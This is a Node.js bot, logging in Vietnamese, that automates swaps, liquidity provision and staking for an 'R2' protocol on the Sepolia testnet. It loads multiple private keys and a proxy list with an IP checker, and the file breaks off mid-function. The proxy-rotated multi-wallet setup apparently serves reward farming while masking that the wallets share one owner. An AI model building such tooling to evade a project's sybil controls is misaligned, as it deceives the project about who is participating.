const fs = require('fs').promises;
const ethers = require('ethers');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const colors = require('colors');
require('dotenv').config();
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

function log(msg, type = 'info') {
    const timestamp = new Date().toLocaleTimeString();
    switch (type) {
        case 'success':
            console.log(`[${timestamp}] [✓] ${msg}`.green);
            break;
        case 'custom':
            console.log(`[${timestamp}] [*] ${msg}`.magenta);
            break;
        case 'error':
            console.log(`[${timestamp}] [✗] ${msg}`.red);
            break;
        case 'warning':
            console.log(`[${timestamp}] [!] ${msg}`.yellow);
            break;
        default:
            console.log(`[${timestamp}] [ℹ] ${msg}`.blue);
    }
}

const networkConfigs = {
    sepolia: {
        rpc: 'https://ethereum-sepolia-rpc.publicnode.com',
        chainId: 11155111,
        nativeToken: 'ETH',
        tokens: {
            USDC: {
                address: '0x8BEbFCBe5468F146533C182dF3DFbF5ff9BE00E2',
                decimals: 6
            },
            BTC: {
                address: '0x4f5b54d4AF2568cefafA73bB062e5d734b55AA05',
                decimals: 8
            },
            R2USD: {
                address: '0x9e8FF356D35a2Da385C546d6Bf1D77ff85133365',
                decimals: 6
            },
            SR2USD: {
                address: '0x006CbF409CA275bA022111dB32BDAE054a97d488',
                decimals: 6
            },
            LP_TOKEN_SR2USD_R2USD: {
                address: '0xe85A06C238439F981c90b2C91393b2F3c46e27FC',
                decimals: 18
            },
            LP_TOKEN_USDC_R2USD: {
                address: '0x47d1B0623bB3E557bF8544C159c9ae51D091F8a2',
                decimals: 18
            },
            R2_TOKEN: {
                address: '0xb816bB88f836EA75Ca4071B46FF285f690C43bb7',
                decimals: 18
            }
        },
        stakingContracts: {
            BTC: {
                address: '0x23b2615d783E16F14B62EfA125306c7c69B4941A'
            },
            R2USD: {
                address: '0x006CbF409CA275bA022111dB32BDAE054a97d488'
            }
        }
    }
};

const erc20Abi = [
    'function balanceOf(address account) view returns (uint256)',
    'function decimals() view returns (uint8)',
    'function approve(address spender, uint256 amount) returns (bool)',
    'function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) returns ()',
    'function DOMAIN_SEPARATOR() view returns (bytes32)',
    'function nonces(address owner) view returns (uint256)'
];

const poolAbi = [
    {
        "stateMutability": "nonpayable",
        "type": "function",
        "name": "exchange",
        "inputs": [
            { "name": "i", "type": "int128" },
            { "name": "j", "type": "int128" },
            { "name": "_dx", "type": "uint256" },
            { "name": "_min_dy", "type": "uint256" }
        ],
        "outputs": [{ "name": "", "type": "uint256" }]
    },
    {
        "stateMutability": "view",
        "type": "function",
        "name": "coins",
        "inputs": [{ "name": "arg0", "type": "uint256" }],
        "outputs": [{ "name": "", "type": "address" }]
    },
    {
        "stateMutability": "nonpayable",
        "type": "function",
        "name": "add_liquidity",
        "inputs": [
            { "name": "_amounts", "type": "uint256[]" },
            { "name": "_min_mint_amount", "type": "uint256" },
            { "name": "_receiver", "type": "address" }
        ],
        "outputs": [{ "name": "", "type": "uint256" }]
    }
];

const stakingR2USDAbi = [
    {
        "type": "function",
        "name": "stake",
        "inputs": [
            { "name": "r2USDValue", "type": "uint256", "internalType": "uint256" }
        ],
        "outputs": [],
        "stateMutability": "nonpayable"
    },
    {
        "type": "function",
        "name": "approve",
        "inputs": [
            { "name": "spender", "type": "address", "internalType": "address" },
            { "name": "value", "type": "uint256", "internalType": "uint256" }
        ],
        "outputs": [{ "name": "", "type": "bool", "internalType": "bool" }],
        "stateMutability": "nonpayable"
    },
    {
        "type": "function",
        "name": "balanceOf",
        "inputs": [{ "name": "account", "type": "address", "internalType": "address" }],
        "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
        "stateMutability": "view"
    }
];

const stakingAbi = [
    {
        type: "function",
        name: "stake",
        inputs: [
            { name: "token", type: "address", internalType: "address" },
            { name: "value", type: "uint256", internalType: "uint256" }
        ],
        outputs: [],
        stateMutability: "payable"
    }
];

const swapAbi = [
    {
        "stateMutability": "nonpayable",
        "type": "function",
        "name": "swapExactTokensForTokens",
        "inputs": [
            { "name": "amountIn", "type": "uint256" },
            { "name": "amountOutMin", "type": "uint256" },
            { "name": "path", "type": "address[]" },
            { "name": "to", "type": "address" },
            { "name": "deadline", "type": "uint256" }
        ],
        "outputs": []
    }
];

const liquidityAbi = [
    {
        "stateMutability": "nonpayable",
        "type": "function",
        "name": "addLiquidity",
        "inputs": [
            { "name": "tokenA", "type": "address" },
            { "name": "tokenB", "type": "address" },
            { "name": "amountADesired", "type": "uint256" },
            { "name": "amountBDesired", "type": "uint256" },
            { "name": "amountAMin", "type": "uint256" },
            { "name": "amountBMin", "type": "uint256" },
            { "name": "to", "type": "address" },
            { "name": "deadline", "type": "uint256" }
        ],
        "outputs": []
    }
];

async function readWallets(filePath) {
    const data = await fs.readFile(filePath, 'utf8');
    return data.split('\n').map(line => line.trim()).filter(line => line);
}

async function readProxies(filePath) {
    const data = await fs.readFile(filePath, 'utf8');
    return data.split('\n').map(line => line.trim()).filter(line => line);
}

async function checkProxyIP(proxy) {
    try {
        const proxyAgent = new HttpsProxyAgent(proxy);
        const response = await axios.get('https://api.ipify.org?format=json', {
            httpsAgent: proxyAgent,
            timeout: 60000
        });
        if (response.status === 200) {
            return response.data.ip;
        } else {
            throw new Error(`Không thể kiểm tra IP của proxy. Status code: ${response.status}`);
        }
    } catch (error) {
        throw new Error(`Lỗi khi kiểm tra IP của proxy: ${error.message}`);
    }
}

async function checkTokenBalance(privateKey, networkConfig, tokenName) {
    try {
        const provider = new ethers.JsonRpcProvider(networkConfig.rpc);
        const wallet = new ethers.Wallet(privateKey, provider);
        const token = new ethers.Contract(
            networkConfig.tokens[tokenName].address,
            erc20Abi,
            provider
        );
        const balance = await token.balanceOf(wallet.address);
        const decimals = networkConfig.tokens[tokenName].decimals;
        const formattedBalance = ethers.formatUnits(balance, decimals);
        return { balance, formattedBalance };
    } catch (error) {
        log(`Lỗi khi kiểm tra số dư ${tokenName} trên ${networkConfig.rpc}: ${error.message}`, 'error');
        return { balance: BigInt(0), formattedBalance: '0' };
    }
}

async function checkNativeBalance(privateKey, networkConfig) {
    try {
        const provider = new ethers.JsonRpcProvider(networkConfig.rpc);
        const wallet = new ethers.Wallet(privateKey, provider);
        const balance = await provider.getBalance(wallet.address);
        const formattedBalance = ethers.formatEther(balance);
        return formattedBalance;
    } catch (error) {
        log(`Lỗi khi kiểm tả số dư ${networkConfig.nativeToken} trên ${networkConfig.rpc}: ${error.message}`, 'error');
        return '0';
    }
}

async function approveToken(privateKey, networkConfig, tokenAddress, spenderAddress, amount) {
    try {
        const provider = new ethers.JsonRpcProvider(networkConfig.rpc);
        const wallet = new ethers.Wallet(privateKey, provider);
        const token = new ethers.Contract(tokenAddress, erc20Abi, wallet);
        
        const tokenName = Object.keys(networkConfig.tokens).find(
            key => networkConfig.tokens[key].address.toLowerCase() === tokenAddress.toLowerCase()
        );
        log(`Đang phê duyệt ${ethers.formatUnits(amount, networkConfig.tokens[tokenName].decimals)} ${tokenName} cho hợp đồng ${spenderAddress}...`, 'custom');
        const tx = await token.approve(spenderAddress, amount, {
            gasLimit: 100000,
            maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
            maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei')
        });
        log(`Giao dịch phê duyệt đã gửi: ${tx.hash}`, 'info');
        const receipt = await tx.wait();
        log(`Phê duyệt ${tokenName} thành công`, 'success');
        return true;
    } catch (error) {
        log(`Lỗi khi phê duyệt token: ${error.message}`, 'error');
        return false;
    }
}

async function swapR2ToTokens(privateKey, networkConfig, userAddress) {
    const swapContractAddress = '0xeE567Fe1712Faf6149d80dA1E6934E354124CfE3';
    const r2TokenAddress = networkConfig.tokens.R2_TOKEN.address;
    const usdcAddress = networkConfig.tokens.USDC.address;
    const r2usdAddress = networkConfig.tokens.R2USD.address;
    const r2TokenBalance = await checkTokenBalance(privateKey, networkConfig, 'R2_TOKEN');
    
    if (r2TokenBalance.balance <= BigInt(0)) {
        log(`Số dư R2 token bằng 0, bỏ qua swap.`, 'warning');
        return false;
    }

    const provider = new ethers.JsonRpcProvider(networkConfig.rpc);
    const wallet = new ethers.Wallet(privateKey, provider);
    const swapContract = new ethers.Contract(swapContractAddress, swapAbi, wallet);

    const twentyFivePercent = BigInt(25);
    const hundred = BigInt(100);
    const amountToSwap = (r2TokenBalance.balance * twentyFivePercent) / hundred;
    const amountOutMin = BigInt(0);
    const deadline = Math.floor(Date.now() / 1000) + 60 * 20;

    const usdcPath = [r2TokenAddress, usdcAddress];
    log(`Đang phê duyệt ${ethers.formatUnits(amountToSwap, networkConfig.tokens.R2_TOKEN.decimals)} R2 token cho swap sang USDC...`, 'custom');
    const usdcApproved = await approveToken(privateKey, networkConfig, r2TokenAddress, swapContractAddress, amountToSwap);
    if (!usdcApproved) {
        log(`Phê duyệt R2 token cho swap USDC thất bại, bỏ qua swap.`, 'warning');
        return false;
    }

    log(`Đang swap ${ethers.formatUnits(amountToSwap, networkConfig.tokens.R2_TOKEN.decimals)} R2 token sang USDC...`, 'custom');
    try {
        const txUsdc = await swapContract.swapExactTokensForTokens(
            amountToSwap,
            amountOutMin,
            usdcPath,
            userAddress,
            deadline,
            {
                gasLimit: 300000,
                maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
                maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei')
            }
        );
        log(`Giao dịch swap R2 sang USDC đã gửi: ${txUsdc.hash}`, 'info');
        await txUsdc.wait();
        log(`Swap R2 sang USDC thành công`, 'success');
    } catch (error) {
        log(`Lỗi khi swap R2 sang USDC: ${error.message}`, 'error');
        return false;
    }

    const r2usdPath = [r2TokenAddress, r2usdAddress];
    log(`Đang phê duyệt ${ethers.formatUnits(amountToSwap, networkConfig.tokens.R2_TOKEN.decimals)} R2 token cho swap sang R2USD...`, 'custom');
    const r2usdApproved = await approveToken(privateKey, networkConfig, r2TokenAddress, swapContractAddress, amountToSwap);
    if (!r2usdApproved) {
        log(`Phê duyệt R2 token cho swap R2USD thất bại, bỏ qua swap.`, 'warning');
        return false;
    }

    log(`Đang swap ${ethers.formatUnits(amountToSwap, networkConfig.tokens.R2_TOKEN.decimals)} R2 token sang R2USD...`, 'custom');
    try {
        const txR2usd = await swapContract.swapExactTokensForTokens(
            amountToSwap,
            amountOutMin,
            r2usdPath,
            userAddress,
            deadline,
            {
                gasLimit: 300000,
                maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
                maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei')
            }
        );
        log(`Giao dịch swap R2 sang R2USD đã gửi: ${txR2usd.hash}`, 'info');
        await txR2usd.wait();
        log(`Swap R2 sang R2USD thành công`, 'success');
    } catch (error) {
        log(`Lỗi khi swap R2 sang R2USD: ${error.message}`, 'error');
        return false;
    }

    return true;
}

async function addLiquidityR2Pairs(privateKey, networkConfig, userAddress) {
    const liquidityContractAddress = '0xeE567Fe1712Faf6149d80dA1E6934E354124CfE3';
    const r2TokenAddress = networkConfig.tokens.R2_TOKEN.address;
    const usdcAddress = networkConfig.tokens.USDC.address;
    const r2usdAddress = networkConfig.tokens.R2USD.address;
    const r2UsdcPairAddress = '0xCdfDD7dD24bABDD05A2ff4dfcf06384c5Ad661a9';
    const r2R2usdPairAddress = '0x9Ae18109692b43e95Ae6BE5350A5Acc5211FE9a1';
    
    const provider = new ethers.JsonRpcProvider(networkConfig.rpc);
    const wallet = new ethers.Wallet(privateKey, provider);
    const liquidityContract = new ethers.Contract(liquidityContractAddress, liquidityAbi, wallet);

    log(`Đang kiểm tra số dư trước khi thêm thanh khoản...`, 'custom');
    const r2Balance = await checkTokenBalance(privateKey, networkConfig, 'R2_TOKEN');
    const usdcBalance = await checkTokenBalance(privateKey, networkConfig, 'USDC');
    const r2usdBalance = await checkTokenBalance(privateKey, networkConfig, 'R2USD');
    log(`Số dư R2 token: ${r2Balance.formattedBalance}`, 'info');
    log(`Số dư USDC: ${usdcBalance.formattedBalance}`, 'info');
    log(`Số dư R2USD: ${r2usdBalance.formattedBalance}`, 'info');

    const minAmount = ethers.parseUnits('1', networkConfig.tokens.R2_TOKEN.decimals);
    const minUsdcAmount = ethers.parseUnits('1', networkConfig.tokens.USDC.decimals);
    const minR2usdAmount = ethers.parseUnits('1', networkConfig.tokens.R2USD.decimals);

    if (r2Balance.balance < minAmount * BigInt(2) || usdcBalance.balance < minUsdcAmount || r2usdBalance.balance < minR2usdAmount) {
        log(`Số dư không đủ: R2 (${r2Balance.formattedBalance}), USDC (${usdcBalance.formattedBalance}), hoặc R2USD (${r2usdBalance.formattedBalance})`, 'warning');
        return false;
    }

    const deadline = Math.floor(Date.now() / 1000) + 60 * 20;

    async function getTokenOrder(tokenA, tokenB) {
        return tokenA.toLowerCase() < tokenB.toLowerCase() ? [tokenA, tokenB] : [tokenB, tokenA];
    }

    async function getPairDetails(pairAddress, tokenA, tokenB) {
        const pairContract = new ethers.Contract(pairAddress, [
            'function getReserves() view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast)',
            'function token0() view returns (address)'
        ], provider);
        
        try {
            const code = await provider.getCode(pairAddress);
            if (code === '0x') {
                log(`Hợp đồng cặp thanh khoản ${pairAddress} không tồn tại`, 'error');
                return { exists: false };
            }

            const token0 = await pairContract.token0();
            const isToken0A = token0.toLowerCase() === tokenA.toLowerCase();
            const { reserve0, reserve1 } = await pairContract.getReserves();
            return { exists: true, isToken0A, reserve0, reserve1 };
        } catch (error) {
            log(`Lỗi khi kiểm tra cặp thanh khoản ${pairAddress}: ${error.message}`, 'error');
            return { exists: false };
        }
    }

    const [token0, token1] = await getTokenOrder(r2TokenAddress, usdcAddress);
    const isR2Token0 = token0.toLowerCase() === r2TokenAddress.toLowerCase();
    let r2Amount = r2Balance.balance / BigInt(4); 
    let usdcAmount = usdcBalance.balance;

    const r2UsdcPairDetails = await getPairDetails(r2UsdcPairAddress, r2TokenAddress, usdcAddress);
    if (!r2UsdcPairDetails.exists) {
        log(`Cặp thanh khoản R2/USDC tại ${r2UsdcPairAddress} không tồn tại, bỏ qua thêm thanh khoản R2/USDC`, 'warning');
    } else {
        if (r2UsdcPairDetails.reserve0 > 0 && r2UsdcPairDetails.reserve1 > 0) {
            if (isR2Token0) {
                const ratio = r2UsdcPairDetails.reserve1 * BigInt(10**18) / r2UsdcPairDetails.reserve0;
                usdcAmount = (r2Amount * ratio) / BigInt(10**18);
                if (usdcAmount > usdcBalance.balance) {
                    usdcAmount = usdcBalance.balance;
                    r2Amount = (usdcAmount * BigInt(10**18)) / ratio;
                }
            } else {
                const ratio = r2UsdcPairDetails.reserve0 * BigInt(10**18) / r2UsdcPairDetails.reserve1;
                usdcAmount = (r2Amount * ratio) / BigInt(10**18);
                if (usdcAmount > usdcBalance.balance) {
                    usdcAmount = usdcBalance.balance;
                    r2Amount = (usdcAmount * BigInt(10**18)) / ratio;
                }
            }
        } else {
            log(`Pool R2/USDC tại ${r2UsdcPairAddress} chưa có thanh khoản, sử dụng số dư hiện có`, 'warning');
        }

        const r2AmountMin = r2Amount * BigInt(95) / BigInt(100);
        const usdcAmountMin = usdcAmount * BigInt(95) / BigInt(100);

        log(`Đang phê duyệt ${ethers.formatUnits(r2Amount, networkConfig.tokens.R2_TOKEN.decimals)} R2 token cho liquidity R2/USDC...`, 'custom');
        const r2ApprovedUsdc = await approveToken(privateKey, networkConfig, r2TokenAddress, liquidityContractAddress, r2Amount);
        if (!r2ApprovedUsdc) {
            log(`Phê duyệt R2 token cho liquidity R2/USDC thất bại`, 'warning');
            return false;
        }

        log(`Đang phê duyệt ${ethers.formatUnits(usdcAmount, networkConfig.tokens.USDC.decimals)} USDC cho liquidity R2/USDC...`, 'custom');
        const usdcApproved = await approveToken(privateKey, networkConfig, usdcAddress, liquidityContractAddress, usdcAmount);
        if (!usdcApproved) {
            log(`Phê duyệt USDC cho liquidity R2/USDC thất bại`, 'warning');
            return false;
        }

        log(`Đang thêm thanh khoản R2/USDC với ${ethers.formatUnits(r2Amount, networkConfig.tokens.R2_TOKEN.decimals)} R2 và ${ethers.formatUnits(usdcAmount, networkConfig.tokens.USDC.decimals)} USDC...`, 'custom');
        try {
            const txUsdc = await liquidityContract.addLiquidity(
                token0,
                token1,
                isR2Token0 ? r2Amount : usdcAmount,
                isR2Token0 ? usdcAmount : r2Amount,
                isR2Token0 ? r2AmountMin : usdcAmountMin,
                isR2Token0 ? usdcAmountMin : r2AmountMin,
                userAddress,
                deadline,
                {
                    gasLimit: 500000,
                    maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
                    maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei')
                }
            );
            log(`Giao dịch add liquidity R2/USDC đã gửi: ${txUsdc.hash}`, 'info');
            await txUsdc.wait();
            log(`Add liquidity R2/USDC thành công`, 'success');
        } catch (error) {
            log(`Lỗi khi thêm thanh khoản R2/USDC: ${error.message}${error.reason ? ` (Reason: ${error.reason})` : ''}`, 'error');
            return false;
        }
    }

    log(`Đang kiểm tra lại số dư sau khi thêm thanh khoản R2/USDC...`, 'custom');
    const updatedR2Balance = await checkTokenBalance(privateKey, networkConfig, 'R2_TOKEN');
    const updatedR2usdBalance = await checkTokenBalance(privateKey, networkConfig, 'R2USD');
    log(`Số dư R2 token (cập nhật): ${updatedR2Balance.formattedBalance}`, 'info');
    log(`Số dư R2USD (cập nhật): ${updatedR2usdBalance.formattedBalance}`, 'info');

    if (updatedR2Balance.balance < minAmount || updatedR2usdBalance.balance < minR2usdAmount) {
        log(`Số dư R2 (${updatedR2Balance.formattedBalance}) hoặc R2USD (${updatedR2usdBalance.formattedBalance}) không đủ để thêm thanh khoản R2/R2USD`, 'warning');
        return true;
    }

    const [token0R2USD, token1R2USD] = await getTokenOrder(r2TokenAddress, r2usdAddress);
    const isR2Token0R2USD = token0R2USD.toLowerCase() === r2TokenAddress.toLowerCase();
    let r2AmountR2usd = updatedR2Balance.balance;
    let r2usdAmount = updatedR2usdBalance.balance;

    const r2R2usdPairDetails = await getPairDetails(r2R2usdPairAddress, r2TokenAddress, r2usdAddress);
    if (!r2R2usdPairDetails.exists) {
        log(`Cặp thanh khoản R2/R2USD tại ${r2R2usdPairAddress} không tồn tại, bỏ qua thêm thanh khoản R2/R2USD`, 'warning');
    } else {
        if (r2R2usdPairDetails.reserve0 > 0 && r2R2usdPairDetails.reserve1 > 0) {
            if (isR2Token0R2USD) {
                const ratio = r2R2usdPairDetails.reserve1 * BigInt(10**18) / r2R2usdPairDetails.reserve0;
                r2usdAmount = (r2AmountR2usd * ratio) / BigInt(10**18);
                if (r2usdAmount > updatedR2usdBalance.balance) {
                    r2usdAmount = updatedR2usdBalance.balance;
                    r2AmountR2usd = (r2usdAmount * BigInt(10**18)) / ratio;
                }
            } else {
                const ratio = r2R2usdPairDetails.reserve0 * BigInt(10**18) / r2R2usdPairDetails.reserve1;
                r2usdAmount = (r2AmountR2usd * ratio) / BigInt(10**18);
                if (r2usdAmount > updatedR2usdBalance.balance) {
                    r2usdAmount = updatedR2usdBalance.balance;
                    r2AmountR2usd = (r2usdAmount * BigInt(10**18)) / ratio;
                }
            }
        } else {
            log(`Pool R2/R2USD tại ${r2R2usdPairAddress} chưa có thanh khoản, sử dụng số dư hiện có`, 'warning');
        }

        const r2AmountR2usdMin = r2AmountR2usd * BigInt(95) / BigInt(100);
        const r2usdAmountMin = r2usdAmount * BigInt(95) / BigInt(100);

        log(`Đang phê duyệt ${ethers.formatUnits(r2AmountR2usd, networkConfig.tokens.R2_TOKEN.decimals)} R2 token cho liquidity R2/R2USD...`, 'custom');
        const r2ApprovedR2usd = await approveToken(privateKey, networkConfig, r2TokenAddress, liquidityContractAddress, r2AmountR2usd);
        if (!r2ApprovedR2usd) {
            log(`Phê duyệt R2 token cho liquidity R2/R2USD thất bại`, 'warning');
            return true;
        }

        log(`Đang phê duyệt ${ethers.formatUnits(r2usdAmount, networkConfig.tokens.R2USD.decimals)} R2USD cho liquidity R2/R2USD...`, 'custom');
        const r2usdApproved = await approveToken(privateKey, networkConfig, r2usdAddress, liquidityContractAddress, r2usdAmount);
        if (!r2usdApproved) {
            log(`Phê duyệt R2USD cho liquidity R2/R2USD thất bại`, 'warning');
            return true;
        }

        log(`Đang thêm thanh khoản R2/R2USD với ${ethers.formatUnits(r2AmountR2usd, networkConfig.tokens.R2_TOKEN.decimals)} R2 và ${ethers.formatUnits(r2usdAmount, networkConfig.tokens.R2USD.decimals)} R2USD...`, 'custom');
        try {
            const txR2usd = await liquidityContract.addLiquidity(
                token0R2USD,
                token1R2USD,
                isR2Token0R2USD ? r2AmountR2usd : r2usdAmount,
                isR2Token0R2USD ? r2usdAmount : r2AmountR2usd,
                isR2Token0R2USD ? r2AmountR2usdMin : r2usdAmountMin,
                isR2Token0R2USD ? r2usdAmountMin : r2AmountR2usdMin,
                userAddress,
                deadline,
                {
                    gasLimit: 500000,
                    maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
                    maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei')
                }
            );
            log(`Giao dịch add liquidity R2/R2USD đã gửi: ${txR2usd.hash}`, 'info');
            await txR2usd.wait();
            log(`Add liquidity R2/R2USD thành công`, 'success');
        } catch (error) {
            log(`Lỗi khi thêm thanh khoản R2/R2USD: ${error.message}${error.reason ? ` (Reason: ${error.reason})` : ''}`, 'error');
            return true;
        }
    }

    return true;
}

async function swapUSDCtoR2USD(privateKey, networkConfig, usdcAmount, poolContractAddress) {
    const usdcAddress = networkConfig.tokens.USDC.address;
    const r2usdContractAddress = '0x9e8FF356D35a2Da385C546d6Bf1D77ff85133365';
    const minR2USD = ethers.parseUnits(
        (ethers.formatUnits(usdcAmount, 6) * 0.99).toFixed(6),
        6
    );

    log(`USDC Amount to Swap: ${ethers.formatUnits(usdcAmount, 6)}`, 'info');
    log(`Min R2USD Expected: ${ethers.formatUnits(minR2USD, 6)}`, 'info');

    try {
        const provider = new ethers.JsonRpcProvider(networkConfig.rpc);
        const wallet = new ethers.Wallet(privateKey, provider);
        const usdcContract = new ethers.Contract(usdcAddress, erc20Abi, wallet);

        log(`Đang approve USDC (${ethers.formatUnits(usdcAmount, 6)} USDC)...`, 'custom');
        const approved = await approveToken(privateKey, networkConfig, usdcAddress, r2usdContractAddress, usdcAmount);
        if (!approved) {
            log(`Phê duyệt USDC thất bại, bỏ qua swap.`, 'warning');
            return false;
        }

        const baseBytes = '0x095e7a95000000000000000000000000198f7a0bdf6e7ef869e22903e8d6f05f426b331d00000000000000000000000000000000000000000000000000000000000f424000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000';
        
        const walletAddressHex = wallet.address.slice(2).toLowerCase();
        const paddedWalletAddress = walletAddressHex.padStart(64, '0');
        
        const amountHex = usdcAmount.toString(16);
        const paddedAmount = amountHex.padStart(64, '0');
        
        const data = '0x095e7a95' +
                     '000000000000000000000000' +
                     paddedWalletAddress.slice(-40) +
                     paddedAmount +
                     '0000000000000000000000000000000000000000000000000000000000000000' +
                     '0000000000000000000000000000000000000000000000000000000000000000' +
                     '0000000000000000000000000000000000000000000000000000000000000000' +
                     '0000000000000000000000000000000000000000000000000000000000000000' +
                     '0000000000000000000000000000000000000000000000000000000000000000';

        log(`Đang đổi ${ethers.formatUnits(usdcAmount, 6)} USDC sang R2USD trên contract ${r2usdContractAddress}...`, 'custom');
        const tx = await wallet.sendTransaction({
            to: r2usdContractAddress,
            data: data,
            gasLimit: 300000,
            maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
            maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei')
        });
        
        log(`Giao dịch swap đã gửi: ${tx.hash}`, 'info');
        const receipt = await tx.wait();
        log(`Swap thành công`, 'success');
        return true;
    } catch (error) {
        log(`Lỗi khi swap USDC sang R2USD: ${error.message}${error.reason ? ` (Reason: ${error.reason})` : ''}`, 'error');
        return false;
    }
}

async function stakeTokens(privateKey, networkConfig, tokenAddress, amount) {
    const stakingContractAddress = networkConfig.stakingContracts.BTC.address;
    try {
        const provider = new ethers.JsonRpcProvider(networkConfig.rpc);
        const wallet = new ethers.Wallet(privateKey, provider);
        const stakingContract = new ethers.Contract(stakingContractAddress, stakingAbi, wallet);

        const approved = await approveToken(privateKey, networkConfig, tokenAddress, stakingContractAddress, amount);
        if (!approved) {
            log(`Phê duyệt thất bại, bỏ qua staking.`, 'warning');
            return false;
        }

        log(`Đang stake ${ethers.formatUnits(amount, networkConfig.tokens.BTC.decimals)} token BTC...`, 'custom');
        const tx = await stakingContract.stake(tokenAddress, amount, {
            gasLimit: 200000,
            maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
            maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei'),
            value: 0
        });
        log(`Giao dịch stake đã gửi: ${tx.hash}`, 'info');
        const receipt = await tx.wait();
        log(`Stake thành công`, 'success');
        return true;
    } catch (error) {
        log(`Lỗi khi stake token: ${error.message}`, 'error');
        return false;
    }
}

async function stakeR2USD(privateKey, networkConfig, amount, networkName) {
    const stakingContractAddress = networkConfig.stakingContracts.R2USD.address;
    const r2usdAddress = networkConfig.tokens.R2USD.address;

    try {
        const provider = new ethers.JsonRpcProvider(networkConfig.rpc);
        const wallet = new ethers.Wallet(privateKey, provider);

        const approved = await approveToken(privateKey, networkConfig, r2usdAddress, stakingContractAddress, amount);
        if (!approved) {
            log(`Phê duyệt R2USD thất bại, bỏ qua staking.`, 'warning');
            return false;
        }

        const baseBytes = '0x1a5f0f0000000000000000000000000000000000000000000000000000000000000f424000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000';
        
        const amountHex = amount.toString(16);
        const paddedAmount = amountHex.padStart(64, '0');
        
        const data = '0x1a5f0f00' +
                     paddedAmount +
                     '0000000000000000000000000000000000000000000000000000000000000000' +
                     '0000000000000000000000000000000000000000000000000000000000000000' +
                     '0000000000000000000000000000000000000000000000000000000000000000' +
                     '0000000000000000000000000000000000000000000000000000000000000000' +
                     '0000000000000000000000000000000000000000000000000000000000000000' +
                     '0000000000000000000000000000000000000000000000000000000000000000';

        log(`Đang stake ${ethers.formatUnits(amount, networkConfig.tokens.R2USD.decimals)} R2USD trên ${networkName}...`, 'custom');
        const tx = await wallet.sendTransaction({
            to: stakingContractAddress,
            data: data,
            gasLimit: 300000,
            maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
            maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei')
        });
        
        log(`Giao dịch stake đã gửi: ${tx.hash}`, 'info');
        const receipt = await tx.wait();
        log(`Stake thành công trên ${networkName}`, 'success');
        return true;
    } catch (error) {
        log(`Lỗi khi stake R2USD trên ${networkName}: ${error.message}${error.reason ? ` (Reason: ${error.reason})` : ''}`, 'error');
        return false;
    }
}

async function addLiquidityR2USD_SR2USD(privateKey, networkConfig, r2usdAmount, sr2usdAmount) {
    const poolContractAddress = networkConfig.tokens.LP_TOKEN_SR2USD_R2USD.address;
    const r2usdAddress = networkConfig.tokens.R2USD.address;
    const sr2usdAddress = networkConfig.tokens.SR2USD.address;
    const lpTokenDecimals = networkConfig.tokens.LP_TOKEN_SR2USD_R2USD.decimals;

    try {
        const provider = new ethers.JsonRpcProvider(networkConfig.rpc);
        const wallet = new ethers.Wallet(privateKey, provider);
        const poolContract = new ethers.Contract(poolContractAddress, poolAbi, wallet);

        log(`Đang kiểm tra token trong pool ${poolContractAddress}...`, 'custom');
        const tokens = [];
        for (let i = 0; i < 2; i++) {
            try {
                const token = await poolContract.coins(i);
                log(`Token tại index ${i}: ${token}`, 'info');
                tokens.push(token.toLowerCase());
            } catch (error) {
                log(`Lỗi khi lấy token tại index ${i}: ${error.message}`, 'error');
                return false;
            }
        }
        const r2usdIndex = tokens.indexOf(r2usdAddress.toLowerCase());
        const sr2usdIndex = tokens.indexOf(sr2usdAddress.toLowerCase());
        if (r2usdIndex === -1 || sr2usdIndex === -1) {
            log(`Không tìm thấy R2USD hoặc SR2USD trong pool ${poolContractAddress}`, 'error');
            return false;
        }

        const amounts = new Array(tokens.length).fill(BigInt(0));
        amounts[r2usdIndex] = r2usdAmount;
        amounts[sr2usdIndex] = sr2usdAmount;

        const r2usdApproved = await approveToken(privateKey, networkConfig, r2usdAddress, poolContractAddress, r2usdAmount);
        if (!r2usdApproved) {
            log(`Phê duyệt R2USD thất bại, bỏ qua add liquidity.`, 'warning');
            return false;
        }
        const sr2usdApproved = await approveToken(privateKey, networkConfig, sr2usdAddress, poolContractAddress, sr2usdAmount);
        if (!sr2usdApproved) {
            log(`Phê duyệt SR2USD thất bại, bỏ qua add liquidity.`, 'warning');
            return false;
        }

        const minMintAmount = ethers.parseUnits('0.99', lpTokenDecimals);

        log(`Đang thêm thanh khoản R2USD/SR2USD: ${ethers.formatUnits(r2usdAmount, networkConfig.tokens.R2USD.decimals)} R2USD và ${ethers.formatUnits(sr2usdAmount, networkConfig.tokens.SR2USD.decimals)} SR2USD...`, 'custom');
        const tx = await poolContract.add_liquidity(
            amounts,
            minMintAmount,
            wallet.address,
            {
                gasLimit: 500000,
                maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
                maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei')
            }
        );
        log(`Giao dịch add liquidity R2USD/SR2USD đã gửi: ${tx.hash}`, 'info');
        const receipt = await tx.wait();
